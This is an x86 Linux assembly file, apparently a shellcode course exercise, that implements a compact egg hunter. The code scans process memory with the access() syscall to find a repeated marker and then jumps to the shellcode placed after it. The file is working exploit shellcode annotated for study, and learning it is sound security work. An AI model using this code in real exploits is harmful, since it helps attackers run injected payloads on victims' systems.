;SLAE-513 Andriy Brukhovetskyy
;egg hunting explained some techniques  
;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;35 bytes

global _start
section .text
_start:

    xor ecx, ecx    ; 0
        
get_memory_block:
    or dx, 0xfff    ; is the same as "add dx, 4095" (PAGE_SIZE)
        
checker:

    inc edx         ; next memory offset
    push byte +0x21 ; __NR_access 33
    pop eax

    lea ebx, [edx+4] ; alignment to validate the last four bytes of the signature
                     ; ecx already contains 0 (F_OK)
    int 0x80         ; syscall

    ; bad address = EFAULT = 0xf2 = -14
    cmp al, 0xf2; because it's not a file

    jz get_memory_block ; if is not, loop

    mov eax, 0x50905090 ; egg here in little endiant
    mov edi, edx
    
        scasd
    jnz checker ; return and search

    scasd; compare next 4 bytes and edi+4 
    jnz checker ; return and search

    jmp edi; if we here == we found the eggs, jump to our shellcode :)